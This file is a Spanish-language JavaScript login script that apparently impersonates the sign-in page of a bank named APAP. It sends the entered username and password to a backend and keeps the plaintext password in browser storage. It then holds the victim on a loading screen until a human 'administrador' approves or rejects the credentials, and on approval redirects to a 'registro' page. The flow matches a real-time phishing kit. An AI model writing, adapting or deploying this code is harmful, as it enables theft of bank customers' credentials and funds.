// script.js
const API_BASE_URL = '/api';

function showLoading(message='Cargando...') {
    if (document.getElementById('loading-overlay')) return;
    const overlay = document.createElement('div');
    overlay.id = 'loading-overlay';
    overlay.style = 'position:fixed;left:0;top:0;right:0;bottom:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.45);z-index:9999';
    overlay.innerHTML = `<div style="background:white;padding:18px;border-radius:8px;text-align:center">${message}<div class="spinner-border" style="margin-top:8px"></div></div>`;
    document.body.appendChild(overlay);
}
function hideLoading() { const e = document.getElementById('loading-overlay'); if (e) e.remove(); }

async function handleLogin(event) {
    event.preventDefault();
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();
    if (!username || !password) { alert('Completa usuario y contraseña'); return; }

    console.log(`[DEBUG] Enviando credenciales para usuario: ${username}`);
    showLoading('Enviando credenciales...');

    try {
        const res = await fetch(`${API_BASE_URL}/apap_login`, {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({ usuario: username, password: password })
        });

        if (!res.ok) {
            hideLoading();
            const txt = await res.text();
            console.error('apap_login failed', res.status, txt);
            alert('Error al enviar credenciales');
            return;
        }

        const data = await res.json();
        if (data.status === 'ok') {
            sessionStorage.setItem('apap_usuario', username);
            sessionStorage.setItem('apap_password', password);
            startLoginPolling(username);
        } else {
            hideLoading();
            alert(data.message || 'Error del servidor');
        }
    } catch (err) {
        hideLoading();
        console.error(err);
        alert('Error de conexión');
    }
}

function startLoginPolling(username) {
    showLoading('Estamos validando tus credenciales...');
    let attempts = 0;
    const maxAttempts = 150;
    const poll = setInterval(async () => {
        attempts++;
        try {
            const res = await fetch(`${API_BASE_URL}/apap_estado/${encodeURIComponent(username)}`);
            if (!res.ok) {
                console.warn('apap_estado not ok', res.status);
                return;
            }
            const data = await res.json();
            if (data.status === 'ok' && data.decision) {
                clearInterval(poll);
                hideLoading();
                // clean server-side state
                fetch(`${API_BASE_URL}/apap_limpiar/${encodeURIComponent(username)}`, { method: 'POST' }).catch(()=>{});
                if (data.decision === 'aprobar') {
                    window.location.href = 'registro.html';
                } else {
                    alert('Credenciales rechazadas por el administrador');
                    sessionStorage.removeItem('apap_usuario');
                    sessionStorage.removeItem('apap_password');
                    document.getElementById('username').value = '';
                    document.getElementById('password').value = '';
                }
            }
            if (attempts >= maxAttempts) {
                clearInterval(poll);
                hideLoading();
                alert('Tiempo agotado. Intenta de nuevo.');
                sessionStorage.removeItem('apap_usuario');
                sessionStorage.removeItem('apap_password');
            }
        } catch (err) {
            console.error('Polling error', err);
        }
    }, 2000);
}

document.addEventListener('DOMContentLoaded', () => {
    const form = document.querySelector('.login-form');
    if (form) form.addEventListener('submit', handleLogin);

    // Optional: if index.html had a registration form and stored profile in sessionStorage,
    // we keep them (no extra action required here). registro.js will read sessionStorage.
});
